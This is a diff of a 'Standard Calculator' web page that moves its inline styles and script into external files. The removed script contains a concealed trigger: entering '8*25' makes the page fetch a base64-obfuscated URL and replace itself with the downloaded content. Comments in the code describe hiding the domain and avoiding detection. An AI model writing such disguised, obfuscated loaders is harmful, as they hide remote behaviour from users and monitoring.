@@ -4,193 +4,41 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Standard Calculator</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f4f4f9;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        .calculator {
-            background-color: #ffffff;
-            padding: 24px;
-            border-radius: 16px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
-            width: 320px;
-        }
-
-        .display {
-            width: 100%;
-            height: 60px;
-            background-color: #f1f3f4;
-            color: #202124;
-            font-size: 32px;
-            text-align: right;
-            border: none;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            padding: 10px;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        .buttons {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-        }
-
-        button {
-            height: 56px;
-            border: none;
-            border-radius: 8px;
-            font-size: 20px;
-            cursor: pointer;
-            transition: background-color 0.1s ease;
-            background-color: #f1f3f4;
-            color: #202124;
-        }
-
-        button:active {
-            background-color: #e8eaed;
-        }
-
-        button.operator {
-            background-color: #dadce0;
-            color: #202124;
-            font-weight: bold;
-        }
-
-        button.operator:active {
-            background-color: #bdc1c6;
-        }
-
-        button.equals {
-            background-color: #1a73e8;
-            color: white;
-            font-weight: bold;
-        }
-
-        button.equals:active {
-            background-color: #1557b0;
-        }
-
-        button.clear {
-            background-color: #fad2cf;
-            color: #c5221f;
-        }
-
-        button.clear:active {
-            background-color: #f7b2ad;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-
-<div class="calculator">
-    <input type="text" id="calc-screen" class="display" value="0" readonly>
-
-    <div class="buttons">
-        <!-- Top row -->
-        <button class="clear" onclick="clearScreen()">C</button>
-        <button class="operator" onclick="appendValue('/')">÷</button>
-        <button class="operator" onclick="appendValue('*')">×</button>
-        <button class="operator" onclick="appendValue('-')">−</button>
-
-        <!-- Numbers -->
-        <button onclick="appendValue('7')">7</button>
-        <button onclick="appendValue('8')">8</button>
-        <button onclick="appendValue('9')">9</button>
-        <button class="operator" onclick="appendValue('+')">+</button>
-
-        <button onclick="appendValue('4')">4</button>
-        <button onclick="appendValue('5')">5</button>
-        <button onclick="appendValue('6')">6</button>
-
-        <!-- Equals spans 2 rows -->
-        <button class="equals" onclick="calculateResult()">=</button>
-
-        <button onclick="appendValue('1')">1</button>
-        <button onclick="appendValue('2')">2</button>
-        <button onclick="appendValue('3')">3</button>
-
-        <!-- Bottom -->
-        <button class="zero" onclick="appendValue('0')">0</button>
-        <button onclick="appendValue('.')">.</button>
-    </div>
-</div>
-<script>
-    let currentExpression = "";
-    const screen = document.getElementById("calc-screen");
-
-    function appendValue(value) {
-        if (currentExpression === "" && ['+', '*', '/'].includes(value)) {
-            return;
-        }
-        currentExpression += value;
-        screen.value = currentExpression;
-    }
-
-    function clearScreen() {
-        currentExpression = "";
-        screen.value = "0";
-    }
-
-    function calculateResult() {
-        if (currentExpression === "") return;
-
-        // --- CALCULATION CONDITION TRIGGER ---
-        if (currentExpression === "8*25") {
-            launchPage();
-            return;
-        }
-
-        try {
-            const result = new Function(`return ${currentExpression}`)();
-            
-            if (result === Infinity || isNaN(result)) {
-                screen.value = "Error";
-                currentExpression = "";
-            } else {
-                screen.value = Number(result.toFixed(8)).toString();
-                currentExpression = screen.value;
-            }
-        } catch (error) {
-            screen.value = "Error";
-            currentExpression = "";
-        }
-    }
-
-    /**
-     * Converts a raw local HTML template string into a dynamic browser Blob URL
-     * and initializes it cleanly inside the active DOM window frame.
-     */
-    async function launchPage() {
-    // 1. Fetch the raw page layout data silently in the background
-    // 2. Base64 encode your destination domain so it is not visible as plain text
-    const encryptedTarget = atob("aHR0cHM6Ly9nb3NwYXJ0YW5zLm5lb2NpdGllcy5vcmc="); 
+    <div class="calculator">
+        <input type="text" id="calc-screen" class="display" value="0" readonly>
     
-    try {
-        const response = await fetch(encryptedTarget);
-        const htmlText = await response.text();
-        
-        // 3. Convert the downloaded response data directly into a local Blob array
-        const secureBlob = new Blob([htmlText], { type: 'text/html' });
-        const secureUrl = URL.createObjectURL(secureBlob);
-        
-        // 4. Overwrite the current environment instead of generating a detectable pop-up
-        document.open();
-        document.write(`<iframe src="${secureUrl}" style="width:100%; height:100vh; border:none;"></iframe>`);
-        document.close();
-    } catch (err) {
-        console.error("Initialization failed.");
-      }
-    }
-</script>
-
+        <div class="buttons">
+            <!-- Top row -->
+            <button class="clear" onclick="clearScreen()">C</button>
+            <button class="operator" onclick="appendValue('/')">÷</button>
+            <button class="operator" onclick="appendValue('*')">×</button>
+            <button class="operator" onclick="appendValue('-')">−</button>
+    
+            <!-- Numbers -->
+            <button onclick="appendValue('7')">7</button>
+            <button onclick="appendValue('8')">8</button>
+            <button onclick="appendValue('9')">9</button>
+            <button class="operator" onclick="appendValue('+')">+</button>
+    
+            <button onclick="appendValue('4')">4</button>
+            <button onclick="appendValue('5')">5</button>
+            <button onclick="appendValue('6')">6</button>
+    
+            <!-- Equals spans 2 rows -->
+            <button class="equals" onclick="calculateResult()">=</button>
+    
+            <button onclick="appendValue('1')">1</button>
+            <button onclick="appendValue('2')">2</button>
+            <button onclick="appendValue('3')">3</button>
+    
+            <!-- Bottom -->
+            <button class="zero" onclick="appendValue('0')">0</button>
+            <button onclick="appendValue('.')">.</button>
+        </div>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
